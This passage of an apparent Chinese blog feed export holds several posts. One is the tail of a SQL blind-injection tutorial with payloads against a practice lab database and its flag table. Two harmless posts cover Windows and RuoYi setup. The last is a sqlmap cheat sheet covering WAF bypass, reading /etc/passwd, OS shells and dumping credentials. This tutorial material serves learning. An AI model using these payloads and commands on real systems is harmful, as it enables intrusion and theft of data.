<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 有数据</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> </span><br><span class="line"><span class="comment">-- 无数据</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>猜测库名长度，这里猜出来是12</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">&lt;=</span><span class="number">12</span></span><br></pre></td></tr></table></figure>
<ul>
<li>一个字符一个字符的猜测库名(一般会写个脚本猜测，这里解释原理)，ASCII码从48-122包含数字，小写字母，大写字母和一些符号，这里猜测出来库名是 kanwolongxia</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 类似于这样，直到猜出来库名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;=</span><span class="number">109</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;=</span><span class="number">103</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;=</span><span class="number">107</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;=</span><span class="number">97</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;=</span><span class="number">110</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">&gt;=</span><span class="number">119</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<ul>
<li>猜解表的数量，这里有3个表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;kanwolongxia&#x27;</span>)<span class="operator">&gt;=</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
<ul>
<li>猜解每个表的名字，第一个表是loflag，第二个表是news，第三个表是user</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;kanwolongxia&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;=</span><span class="number">109</span></span><br></pre></td></tr></table></figure>
<ul>
<li>猜解表的数据，先看有几个字段，再猜解表字段是什么。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看表有几个字段</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;kanwolongxia&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;loflag&#x27;</span>)<span class="operator">&gt;</span><span class="number">1</span></span><br><span class="line"><span class="comment">-- 猜字段，loflag的第一个字段是Id，第二个字段是flaglo</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;kanwolongxia&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;loflag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;=</span><span class="number">97</span></span><br><span class="line"><span class="comment">-- 猜解flag，有五条数据，第一条是zKaQ-QQQ</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> flaglo <span class="keyword">from</span> loflag limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;=</span><span class="number">97</span></span><br></pre></td></tr></table></figure>
<h1>Head注入</h1>
<p>尚未更新</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>Web安全</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10 修改默认文件资源管理器</title>
    <url>/posts/ce14aeee/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>首先安装新的文件管理器，这里以Sigma file manager为例。<br>
打开注册表<br>
<img src="a-a-a.png" alt=""><br>
修改数值数据为Sigma file manager的路径<br>
<img src="a-a-b.png" alt=""><br>
<img src="a-a-c.png" alt=""><br>
重启计算机即可</p>
]]></content>
      <tags>
        <tag>Win10</tag>
        <tag>文件管理器</tag>
        <tag>注册表</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10 部署若依前端分离版</title>
    <url>/posts/621e92f2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>环境部署</h1>
<blockquote>
<p>开发和生产都是此环境</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">JDK &gt;= 1.8 (推荐1.8版本)</span><br><span class="line">Mysql &gt;= 5.7.0 (推荐5.7版本)</span><br><span class="line">Redis &gt;= 3.0</span><br><span class="line">Maven &gt;= 3.0</span><br><span class="line">Node &gt;= 12</span><br></pre></td></tr></table></figure>
<h1>下载源码</h1>
<p>建议用 git clone 来克隆项目。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/y_project/RuoYi-Vue.git</span><br></pre></td></tr></table></figure>
<p><img src="a-a-d.png" alt=""></p>
<p>网址：<code>https://ruoyi.vip/</code><br>
<img src="a-a-a.png" alt=""><br>
<img src="a-a-b.png" alt=""><br>
<img src="a-a-c.png" alt=""></p>
<blockquote>
<p>个人习惯，可以不做</p>
</blockquote>
<p>将ruoyi-ui移动到上一级目录，并将RuoYi-Vue修改为ruoyi-master<br>
<img src="a-a-e.png" alt=""><br>
<img src="a-a-q.png" alt=""></p>
<h1>开发环境部署</h1>
<h2 id="后端配置和运行">后端配置和运行</h2>
<p><img src="a-a-w.png" alt=""><br>
<img src="a-a-r.png" alt=""><br>
<img src="a-a-t.png" alt=""><br>
<img src="a-a-y.png" alt=""></p>
<h2 id="前端配置和运行">前端配置和运行</h2>
<p><img src="a-a-u.png" alt=""><br>
<img src="a-a-i.png" alt=""><br>
<img src="a-a-o.png" alt=""></p>
<h1>生产环境部署</h1>
<blockquote>
<p>此处生产环境为Centos7</p>
</blockquote>
<p><img src="a-a-p.png" alt=""><br>
<img src="a-a-s.png" alt=""><br>
<img src="a-a-f.png" alt=""><br>
<img src="a-a-h.png" alt=""><br>
<img src="a-a-j.png" alt=""><br>
详细配置见若依文档<code>https://doc.ruoyi.vip/</code><br>
<img src="a-a-g.png" alt=""><br>
<img src="a-a-k.png" alt=""></p>
]]></content>
      <tags>
        <tag>RuoYi</tag>
        <tag>若依管理系统</tag>
        <tag>前端分离版</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap 注入</title>
    <url>/posts/304b10ed/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>基本检测</h1>
<h2 id="检测-GET-参数">检测 GET 参数</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page?param=value&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="检测-POST-参数">检测 POST 参数</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com/login&quot;</span> --data=<span class="string">&quot;username=admin&amp;password=pass&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="只检测特定参数">只检测特定参数</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page?id=1&amp;name=test&quot;</span> -p <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
<h2 id="添加会话-Cookie">添加会话 Cookie</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com/protected&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=abc123&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="指定数据库类型">指定数据库类型</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --dbms=mysql</span><br></pre></td></tr></table></figure>
<h2 id="使用随机-User-Agent">使用随机 User-Agent</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --random-agent</span><br></pre></td></tr></table></figure>
<h2 id="使用代理">使用代理</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --proxy=<span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="使用-tamper-脚本绕过防护">使用 tamper 脚本绕过防护</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --tamper=space2comment</span><br></pre></td></tr></table></figure>
<h2 id="风险级别和测试强度">风险级别和测试强度</h2>
<p>–level 参数（测试级别）<br>
​​Level 1​​：仅测试 GET 参数（默认）<br>
​​Level 2​​：测试 GET 和 POST 参数<br>
​​Level 3​​：增加 HTTP Cookie 头测试<br>
​​Level 4​​：增加 HTTP User-Agent 和 Referer 头测试<br>
​​Level 5​​：测试所有 HTTP 头（包括 Host 头）</p>
<p>–risk 参数（风险级别）<br>
​​Risk 1​​：使用低风险 payload（如基于错误的注入）<br>
​​Risk 2​​：增加基于时间的盲注和布尔盲注<br>
​​Risk 3​​：使用 OR-based 注入（可能修改数据）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --level=5 --risk=3</span><br></pre></td></tr></table></figure>
<h2 id="检测数据库版本">检测数据库版本</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span>  --banner</span><br></pre></td></tr></table></figure>
<h2 id="检测当前用户">检测当前用户</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --current-user</span><br></pre></td></tr></table></figure>
<h2 id="获取所有数据库名称">获取所有数据库名称</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --dbs</span><br></pre></td></tr></table></figure>
<h2 id="获取当前数据库名称">获取当前数据库名称</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --current-db</span><br></pre></td></tr></table></figure>
<h2 id="获取指定数据库的所有表">获取指定数据库的所有表</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> -D &lt;database_name&gt; --tables</span><br></pre></td></tr></table></figure>
<h2 id="获取当前数据库的所有表">获取当前数据库的所有表</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --tables</span><br></pre></td></tr></table></figure>
<h2 id="获取指定表的所有列">获取指定表的所有列</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> -D &lt;database_name&gt; -T &lt;table_name&gt; --columns</span><br></pre></td></tr></table></figure>
<h2 id="提取整个表的数据">提取整个表的数据</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> -D &lt;database_name&gt; -T &lt;table_name&gt; --dump</span><br></pre></td></tr></table></figure>
<h2 id="提取特定列的数据">提取特定列的数据</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> -D &lt;database_name&gt; -T &lt;table_name&gt; -C <span class="string">&quot;username,password&quot;</span> --dump</span><br></pre></td></tr></table></figure>
<h2 id="获取数据库用户列表">获取数据库用户列表</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
<h2 id="获取用户权限">获取用户权限</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --privileges</span><br></pre></td></tr></table></figure>
<h2 id="获取操作系统信息">获取操作系统信息</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --os-info</span><br></pre></td></tr></table></figure>
<h2 id="读取服务器文件（需要高权限）">读取服务器文件（需要高权限）</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --file-read <span class="string">&quot;/etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="写入文件（需要高权限）">写入文件（需要高权限）</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --file-write <span class="string">&quot;local_file.txt&quot;</span> --file-dest <span class="string">&quot;/remote/path/file.txt&quot;</span> </span><br></pre></td></tr></table></figure>
<h2 id="执行操作系统命令">执行操作系统命令</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --os-cmd <span class="string">&quot;id&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="获取交互式-shell">获取交互式 shell</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>
<h2 id="提取所有数据库的所有数据">提取所有数据库的所有数据</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --dump-all</span><br></pre></td></tr></table></figure>
<h2 id="使用多线程加速">使用多线程加速</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --threads=10</span><br></pre></td></tr></table></figure>
<h2 id="使用代理（如-Burp-Suite）">使用代理（如 Burp Suite）</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --proxy=<span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="使用-tamper-脚本绕过-WAF">使用 tamper 脚本绕过 WAF</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --tamper=space2comment</span><br></pre></td></tr></table></figure>
<h2 id="保存会话以便后续使用">保存会话以便后续使用</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --save</span><br></pre></td></tr></table></figure>
<h2 id="清除缓存">清除缓存</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --purge</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>sqlmap</tag>
        <tag>Web 安全</tag>
      </tags>
  </entry>
</search>
